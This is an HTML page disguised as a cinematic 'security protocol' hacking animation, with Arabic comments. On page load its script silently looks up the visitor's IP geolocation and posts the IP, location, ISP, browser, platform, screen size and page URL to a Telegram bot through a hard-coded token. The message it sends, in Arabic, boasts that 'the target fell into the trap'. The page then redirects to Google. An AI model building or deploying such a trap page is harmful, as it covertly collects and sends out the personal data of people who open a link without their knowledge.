<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Security Protocol v4.0</title>
    <style>
        /* CSS متطور جداً لمظهر سينمائي */
        body {
            background-color: #050a0f;
            color: #00ff41;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .main-container {
            width: 90%;
            max-width: 800px;
            background: rgba(0, 20, 40, 0.9);
            border: 1px solid #00ff41;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            position: relative;
        }

        .header {
            border-bottom: 1px solid #00ff41;
            padding-bottom: 10px;
            margin-bottom: 20px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
        }

        #terminal {
            height: 300px;
            overflow-y: hidden;
            font-size: 14px;
            line-height: 1.6;
            text-align: left;
            direction: ltr;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #111;
            margin-top: 15px;
            position: relative;
        }

        .progress-fill {
            width: 0%;
            height: 100%;
            background: #00ff41;
            box-shadow: 0 0 10px #00ff41;
            transition: width 0.1s;
        }

        .scan-line {
            width: 100%;
            height: 2px;
            background: rgba(0, 255, 65, 0.5);
            position: absolute;
            top: 0;
            left: 0;
            animation: scan 4s linear infinite;
        }

        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }

        .status-text {
            font-size: 12px;
            margin-top: 10px;
            color: #888;
        }
    </style>
</head>
<body>

<div class="main-container">
    <div class="scan-line"></div>
    <div class="header">
        <span>[ SYSTEM_SECURITY_CORE_v4 ]</span>
        <span>STATUS: RUNNING</span>
    </div>
    
    <div id="terminal"></div>
    
    <div class="progress-bar">
        <div id="fill" class="progress-fill"></div>
    </div>
    
    <div class="status-text" id="status">INITIALIZING ENCRYPTED UPLINK...</div>
</div>

<script>
    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
    const CHAT_ID = '7396462490';

    const terminal = document.getElementById('terminal');
    const fill = document.getElementById('fill');
    const status = document.getElementById('status');

    const lines = [
        "> INITIALIZING SECURITY AUDIT...",
        "> ACCESSING GLOBAL DATABASE...",
        "> SCANNING NETWORK TOPOLOGY...",
        "> BYPASSING LOCAL FIREWALL...",
        "> EXTRACTING NODE INFORMATION...",
        "> ANALYZING USER AGENT DATA...",
        "> PACKET INSPECTION: SUCCESSFUL",
        "> LOCATION GEOLOCATION: ACQUIRED",
        "> SYNCING WITH CLOUD SERVER...",
        "> PROCESS COMPLETE."
    ];

    let currentLine = 0;
    let progress = 0;

    async function startHackerAnimation() {
        // جمع البيانات فوراً وبصمت
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            // إرسال البيانات فوراً قبل انتهاء الأنميشن
            const text = `
🔥 **نظام التجسس المطور (V4)** 🔥
👤 **الهدف سقط في الفخ بنجاح!**
━━━━━━━━━━━━━━
🌐 **العنوان (IP):** \`${data.ip}\`
📍 **الموقع:** ${data.city}, ${data.country}
📶 **مزود الخدمة:** ${data.org}
📱 **الجهاز:** ${navigator.userAgent}
💻 **النظام:** ${navigator.platform}
🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
🔗 **رابط الفخ:** ${window.location.href}
━━━━━━━━━━━━━━
            `;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        } catch(e) {}

        // أنميشن الـ Terminal
        let interval = setInterval(() => {
            if (currentLine < lines.length) {
                terminal.innerHTML += `<div style="margin-bottom:5px">${lines[currentLine]}</div>`;
                currentLine++;
                progress += 10;
                fill.style.width = progress + "%";
                status.innerText = "DATA ANALYSIS: " + progress + "%";
            } else {
                clearInterval(interval);
                status.innerText = "ACCESS GRANTED. REDIRECTING...";
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1500);
            }
        }, 400);
    }

    window.onload = startHackerAnimation;
</script>

</body>
</html>
